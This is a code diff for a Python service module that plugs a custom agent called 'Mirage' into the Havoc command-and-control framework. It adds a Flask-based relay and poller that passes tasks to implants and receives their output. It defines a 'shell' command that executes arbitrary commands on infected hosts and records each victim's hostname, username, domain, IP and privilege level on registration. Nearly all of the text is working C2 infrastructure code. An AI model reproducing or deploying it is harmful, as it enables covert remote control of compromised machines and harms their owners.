@@ -1,41 +1,36 @@
-from base64 import b64decode
+from base64 import b64decode, b64encode
 import json
+import requests as http
+import time
+import base64
+import struct
+from threading import Thread
 from havoc.service import HavocService
 from havoc.agent import *
-import os 
+import os
 
-COMMAND_REGISTER         = 0x100
-COMMAND_GET_JOB          = 0x101
-COMMAND_NO_JOB           = 0x102
-COMMAND_SHELL            = 0x152
-COMMAND_EXIT             = 0x155
-COMMAND_OUTPUT           = 0x200
+FLASK_URL = "http://127.0.0.1:4696"
 
-# ====================
-# ===== Commands =====
-# ====================
+COMMAND_SHELL = 0x152
+COMMAND_EXIT  = 0x155
+
+
 class CommandShell(Command):
-    CommandId = COMMAND_SHELL
-    Name = "shell"
+    CommandId   = COMMAND_SHELL
+    Name        = "shell"
     Description = "executes commands"
-    Help = ""
-    NeedAdmin = False
-    Params = [
-        CommandParam(
-            name="commands",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
-    Mitr = []
+    Help        = ""
+    NeedAdmin   = False
+    Params      = [CommandParam(name="commands", is_file_path=False, is_optional=False)]
+    Mitr        = []
 
-    def job_generate( self, arguments: dict ) -> bytes:
+    def job_generate(self, arguments: dict):
         Task = Packer()
-        print("[+] CommandShell: "+str(arguments))
-        Task.add_data(arguments[ 'commands' ])
+        Task.add_data(arguments['commands'])
         return Task.buffer
 
-class CommandExit( Command ):
+
+class CommandExit(Command):
     CommandId   = COMMAND_EXIT
     Name        = "exit"
     Description = "tells the python agent to exit"
@@ -44,92 +39,195 @@ class CommandExit( Command ):
     Mitr        = []
     Params      = []
 
-    def job_generate( self, arguments: dict ) -> bytes:
-
+    def job_generate(self, arguments: dict):
         Task = Packer()
-
         Task.add_data("goodbye")
-
         return Task.buffer
 
-# =======================
-# ===== Agent Class =====
-# =======================
+
 class python(AgentType):
-    Name = "Mirage"
-    Author = "@711intern"
-    Version = "1.0"
-    Description = f"""Super cool custom C2 channel agent."""
-    MagicValue = 0x41414141
+    Name        = "Mirage"
+    Author      = "@711intern"
+    Version     = "1.0"
+    Description = "Super cool custom C2 channel agent."
+    MagicValue  = 0x41414141
 
-    Arch = [
-        "x64",
-        "x86",
-    ]
+    Arch           = ["x64", "x86"]
+    Formats        = [{"Name": "Python script", "Extension": "py"}]
+    BuildingConfig = {"Sleep": "10"}
+    Commands       = [CommandShell(), CommandExit()]
 
-    Formats = [
-        {
-            "Name": "Python script",
-            "Extension": "py",
-        },
-    ]
+    _registered_agents: dict = {}
 
-    BuildingConfig = {
-        "Sleep": "10"
-    }
+    def _relay_to_agent(self, data: bytes):
+        try:
+            encoded = b64encode(data).decode('utf-8')
+            http.post(f"{FLASK_URL}/api/sync", json={"data": encoded})
+            print(f"[+] Relayed {len(data)} bytes to agent via Flask")
+        except Exception as e:
+            print(f"[-] Flask relay failed: {e}")
 
-    Commands = [
-        CommandShell(),
-        CommandExit(),
-    ]
+    def _poll_flask(self):
+        seen = set()
+        print("[+] Flask poller running")
 
-    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
-    def generate( self, config: dict ) -> None:
+        while True:
+            try:
+                r         = http.get(f"{FLASK_URL}/api/sync")
+                agentdata = r.json().get("data")
+            except Exception:
+                agentdata = None
 
-        print( f"config: {config}" )
+            if agentdata and agentdata not in seen:
+                try:
+                    raw = base64.b64decode(agentdata)
+                except Exception as e:
+                    print(f"[-] Decode error: {e}")
+                    time.sleep(0.5)
+                    continue
 
-        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
+                payload_str = raw[12:].decode('utf-8', errors='ignore')
+                is_register = "register" in payload_str
+                is_gettask  = "gettask"  in payload_str
 
-        # build_send_payload. this function send back your generated payload
-        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') ) # this is just an example.
+                print(f"[+] {'Register' if is_register else 'Gettask' if is_gettask else 'Unknown'} packet ({len(raw)} bytes)")
 
-    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
-    def response( self, response: dict ) -> bytes:
-        agent_header = response[ "AgentHeader" ]
+                size_val    = struct.unpack(">I", raw[:4])[0]
+                magic_hex   = raw[4:8].hex()
+                agentid_hex = raw[8:12].hex()
+                agentid_int = int(agentid_hex, 16)
+                name_id     = f"{agentid_int:08x}"
 
-        print("Received request from agent")
-        agent_header = response[ "AgentHeader" ]
-        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
-        agentjson = json.loads(agent_response)
-        if agentjson["task"] == "register":
-            print("[*] Registered agent")
-            self.register( agent_header, json.loads(agentjson["data"]) )
-            AgentID = response[ "AgentHeader" ]["AgentID"]
-            self.console_message( AgentID, "Good", f"Python agent {AgentID} registered", "" )
+                full_agent = self._registered_agents.get(name_id, {"NameID": name_id})
+
+                fake_response = {
+                    "AgentHeader": {
+                        "Size":       str(size_val),
+                        "MagicValue": magic_hex,
+                        "AgentID":    agentid_hex
+                    },
+                    "Response": b64encode(raw[12:]).decode('utf-8'),
+                    "Agent":    full_agent
+                }
+
+                self.response(fake_response)
+
+                if is_register:
+                    seen.add(agentdata)
+                elif is_gettask:
+                    seen.clear()
+
+            time.sleep(0.5)
+
+    def generate(self, config: dict):
+        self.builder_send_message(config['ClientID'], "Info", "hello from service builder")
+        self.builder_send_payload(config['ClientID'], self.Name + ".bin", b"test bytes")
+
+    def response(self, response: dict):
+        print("[*] Received request from agent")
+
+        agent_header   = response["AgentHeader"]
+        agent_response = b64decode(response["Response"])
+
+        try:
+            agentjson = json.loads(agent_response)
+        except Exception as e:
+            print(f"[-] JSON parse failed: {e}")
+            self._relay_to_agent(b'')
+            return b''
+
+        task = agentjson.get("task", "")
+        print(f"[*] Task type: {task}")
+
+        if task == "register":
+            print("[*] Processing registration...")
+            try:
+                agent_details = json.loads(agentjson["data"])
+            except Exception:
+                agent_details = agentjson["data"]
+
+            agentid_hex = agent_header["AgentID"]
+            agentid_int = int(agentid_hex, 16)
+            name_id     = f"{agentid_int:08x}"
+
+            profile = {
+                "NameID":            name_id,
+                "Hostname":          agent_details.get("Hostname", ""),
+                "Username":          agent_details.get("Username", ""),
+                "Domain":            agent_details.get("Domain", ""),
+                "InternalIP":        agent_details.get("InternalIP", ""),
+                "Process Path":      agent_details.get("ProcessPath", ""),
+                "Process Name":      agent_details.get("ProcessName", "python"),
+                "Process Arch":      agent_details.get("Architecture", "x64"),
+                "Process ID":        str(agent_details.get("PID", 0)),
+                "Process Parent ID": str(agent_details.get("PPID", 0)),
+                "Process Elevated":  str(agent_details.get("Elevated", False)),
+                # 5 dot-separated ints: major.minor.workstation_flag.sp.build
+                # [10, 0, 1, 0, 19041] -> Windows 10
+                "OS Version":        "10.0.1.0.19041",
+                "OS Build":          agent_details.get("OSBuild", "19041"),
+                "OS Arch":           agent_details.get("Architecture", "x64"),
+                "SleepDelay":        str(agent_details.get("Sleep", 5)),
+            }
+
+            self._registered_agents[name_id] = profile
+
+            self.register(agent_header, profile)
+            self.console_message(name_id, "Good", f"Agent {name_id} registered!", "")
+            print(f"[+] Registered agent: {name_id}")
+
+            self._relay_to_agent(b'registered')
             return b'registered'
-        elif agentjson["task"] == "gettask":
-            AgentID = response[ "Agent" ][ "NameID" ]
-            print("[*] Agent requested taskings")
-            Tasks = self.get_task_queue( response[ "Agent" ] )
-            print("Tasks retrieved")
-            if len(agentjson["data"]) > 0:
-                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
-        return Tasks
+
+        elif task == "gettask":
+            agent_obj = response.get("Agent")
+            if not agent_obj:
+                print("[-] No Agent object")
+                self._relay_to_agent(b'notask')
+                return b'notask'
+
+            name_id = agent_obj.get("NameID", "unknown")
+            print(f"[*] Agent {name_id} checking in")
+
+            output = agentjson.get("data", "")
+            if output:
+                self.console_message(name_id, "Good", "Output:", output)
+
+            Tasks = self.get_task_queue(agent_obj)
+            print(f"[DEBUG] Tasks: {repr(Tasks)}")
+
+            if Tasks and len(Tasks) > 0:
+                self._relay_to_agent(Tasks)
+                return Tasks
+            else:
+                self._relay_to_agent(b'notask')
+                return b'notask'
+
+        print(f"[-] Unknown task: {task}")
+        self._relay_to_agent(b'')
+        return b''
+
 
 def main():
     Havoc_python = python()
     print(os.getpid())
-    print( "[*] Connect to Havoc service API" )
+    print("[*] Connect to Havoc service API")
+
     havoc_service = HavocService(
         endpoint="wss://127.0.0.1:40056/service-endpoint",
         password="service-password"
-    ) # TODO:  Make sure to replace the endpoint and password with your own (these are the default values).
-    print( "[*] Register python to Havoc" )
+    )
+
+    print("[*] Register agent with Havoc")
     havoc_service.register_agent(Havoc_python)
-    return
+
+    poller = Thread(target=Havoc_python._poll_flask, daemon=True)
+    poller.start()
+    print("[+] Poller thread started")
+
+    while True:
+        time.sleep(1)
+
 
 if __name__ == '__main__':
     main()
